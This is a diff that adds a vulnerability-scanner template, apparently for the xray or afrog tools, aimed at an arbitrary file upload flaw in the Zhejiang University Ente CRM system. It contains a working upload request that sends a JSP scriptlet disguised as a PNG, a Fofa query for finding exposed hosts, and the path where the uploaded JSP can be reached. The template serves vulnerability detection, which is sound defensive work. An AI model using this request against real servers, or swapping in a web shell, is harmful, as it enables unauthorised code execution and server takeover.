@@ -1,0 +1,36 @@
+id: zheda-ente-customer-resource-management-system-fileupload
+
+info:
+  name: 浙大恩特客户资源管理系统任意文件上传
+  author: laohuan12138
+  severity: critical
+  verified: true
+  description: |
+    浙大恩特客户资源管理系统存在任意文件上传漏洞，攻击者通过漏洞可以上传恶意文件，获取服务器权限。
+    访问文件：http://x.x.x.x:82/enterdoc/EnterMail/20240226/1/1357294.jsp
+    Fofa：app="浙大恩特客户资源管理系统"
+  reference:
+    - https://xz.aliyun.com/t/13088
+  tags: zheda,fileupload
+  created: 2024/02/26
+
+set:
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /entsoft/MailAction.entphone;.js?act=AppUpload&bodyID=1
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"1.png\"\r\n\
+        Content-Type: image/jsp\r\n\
+        \r\n\
+        {{<%= (new java.util.Date()).toLocaleString()%>}}\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200 && response.body.bcontains(b'path') && response.body.bcontains(b'AttName') && response.body.bcontains(b'上传成功')
+    # 访问文件：http://x.x.x.x:82/enterdoc/EnterMail/20240226/1/1357294.jsp
+expression: r0()
